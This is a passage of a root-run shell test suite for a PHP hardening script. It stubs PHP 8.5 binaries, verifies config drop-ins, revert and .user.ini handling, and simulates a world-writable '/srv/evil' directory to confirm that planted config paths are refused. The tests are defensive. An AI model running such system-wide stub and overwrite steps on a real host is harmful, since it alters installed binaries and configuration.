echo "$out" | grep -Eq '(PATCHED|EOL), mitigation' && ! echo "$out" | grep -q 'fixed versions not known' && pass "--check classifies against the fixed versions" || fail "--check still unknown"

echo "== stub PHP 8.5: fatal_error_backtraces"
mkdir -p /etc/php85stub/conf.d
cat > /usr/bin/php85 <<'STUB'
#!/bin/sh
case "$1$2" in
  --ini*) echo "Scan for additional .ini files in: /etc/php85stub/conf.d" ;;
  *PHP_VERSION*) echo "${STUB_VER:-8.5.11}" ;;
  *fatal_error_backtraces*) [ -f /etc/php85stub/conf.d/zz-php2shell.ini ] && echo || echo 1 ;;
  *) echo ;;
esac
STUB
chmod +x /usr/bin/php85
bash $S --check 2>&1 | grep -q 'php85 .*fatal_error_backtraces is On' && pass "--check flags fatal_error_backtraces On on 8.5" || fail "--check missed 8.5 backtraces"
out="$(bash $S --no-restart)"; rc=$?
[ "$rc" = 0 ] && grep -q '^fatal_error_backtraces = Off$' /etc/php85stub/conf.d/zz-php2shell.ini && pass "fix writes the 8.5 drop-in" || fail "8.5 drop-in not written (rc=$rc)"
echo "$out" | grep -q 'fatal_error_backtraces: Off' && pass "fix verifies backtraces Off" || fail "backtraces not verified"
bash $S --no-restart | grep -q 'Wrote fatal_error_backtraces' && fail "8.5 drop-in not idempotent" || pass "8.5 drop-in idempotent"
rm -f /etc/php85stub/conf.d/zz-php2shell.ini
STUB_VER=8.5.12 bash $S --no-restart >/dev/null
[ -f /etc/php85stub/conf.d/zz-php2shell.ini ] && fail "drop-in written on patched 8.5" || pass "patched 8.5 left alone"
printf '#!/bin/sh\ncase "$1" in -v) echo "PHP 8.5.12 (fpm-fcgi)";; -i) printf "memory_limit => -1 => -1\\nsession.upload_progress.enabled => Off => Off\\n";; esac\n' > /usr/sbin/php-fpm85stub
chmod +x /usr/sbin/php-fpm85stub
out="$(bash $S --check 2>&1)"
echo "$out" | grep -q 'php-fpm85stub .*memory_limit is -1' && pass "--check warns about leftover memory_limit = -1 (FPM)" || fail "no memory_limit -1 warning"
echo "$out" | grep -q '/usr/bin/php[0-9.]* .*memory_limit is -1' && fail "memory_limit warning on CLI (-1 is the CLI default)" || pass "no memory_limit warning on CLI"
rm -f /usr/sbin/php-fpm85stub
bash $S --no-restart >/dev/null   # leave it in place for the --revert test
bash $S --revert; expect_rc 0 $? "revert"
same "$CLI_INI" /root/cli.ini.orig && pass "php.ini restored byte-for-byte" || fail "php.ini not restored"
grep -q 'php_admin_flag' "$POOL2" && fail "locked pool not restored" || pass "locked pool restored"
ls /etc/apache2/conf-available/zz-php2shell.conf /etc/apache2/conf-enabled/zz-php2shell.conf >/dev/null 2>&1 \
  && fail "mod_php conf still present" || pass "mod_php conf removed"
[ -f /etc/php85stub/conf.d/zz-php2shell.ini ] && fail "8.5 drop-in not removed by revert" || pass "8.5 drop-in removed by revert"
rm -rf /usr/bin/php85 /etc/php85stub
[ "$MODPHP" = 1 ] && { apache2ctl -t >/dev/null 2>&1 && pass "apache config valid after revert" || fail "apache broken after revert"; }

echo "== --user-ini (shared hosting, no root)"
mkdir -p /srv/site && chown "$WEBUSER" /srv/site
su -s /bin/bash "$WEBUSER" -c "bash $S --user-ini=/srv/site" >/dev/null; expect_rc 0 $? "--user-ini as site user"
grep -q '^session.upload_progress.enabled = 0$' /srv/site/.user.ini && pass ".user.ini written" || fail ".user.ini not written"
su -s /bin/bash "$WEBUSER" -c "bash $S --user-ini=/srv/site" | grep -q 'Already Off' && pass "--user-ini idempotent" || fail "--user-ini not idempotent"
bash $S --user-ini=/srv/site >/dev/null 2>&1; expect_rc 1 $? "--user-ini refused as root"

echo "== symlink planting refused"
mkdir -p /srv/evil && chmod 777 /srv/evil && printf '[Session]\n' > /srv/evil/php.ini
sed -e 's#^SEARCH_ROOTS=.*#SEARCH_ROOTS=(/srv/evil)#' $S > /tmp/s.sh
bash /tmp/s.sh --no-restart >/dev/null 2>&1
grep -q upload_progress /srv/evil/php.ini && fail "wrote into world-writable dir" || pass "world-writable dir skipped"

echo
echo "RESULT: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
